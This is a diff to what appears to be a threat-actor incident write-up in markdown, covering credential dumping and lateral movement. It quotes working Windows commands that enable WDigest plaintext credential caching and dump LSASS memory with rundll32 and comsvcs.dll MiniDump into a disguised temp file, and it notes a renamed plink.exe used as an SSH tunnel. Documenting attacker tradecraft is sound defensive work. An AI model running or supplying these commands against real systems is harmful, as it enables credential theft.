@@ -29,16 +29,21 @@
   ```
 #### 4. Credential Dumping
 - The Threat Actor Checked if the `WDigest` is Enabled because When WDigest is Enabled `LSASS` stores passwords in Plaintext.
-- Command Used:
+- Check WDigest:
   ```
    powershell.exe reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
   ```
-- Command To Enable WDigest:
+- Enable WDigest:
   ```
   powershell.exe  Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'
   ```
- - Stealing Credentials:
+ - Stealing Credentials (Dumping LSASS):
    ```
-   C:\windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll MiniDump  C:\windows\temp\logctl.zip full
+   C:\windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll MiniDump [LSASS_PROC_ID] C:\windows\temp\logctl.zip full
    ``` 
+
+ #### 5. Lateral Movement
+ - Threat Actor Downloaded file.exe and wrote it to ekern.exe and this file was realy a renamed `plink.exe`
+ - `plink.exe`: A command-line SSH client
+   ![image](https://github.com/user-attachments/assets/85dc8953-0f11-4624-85cc-49dd3170e433)
  - 
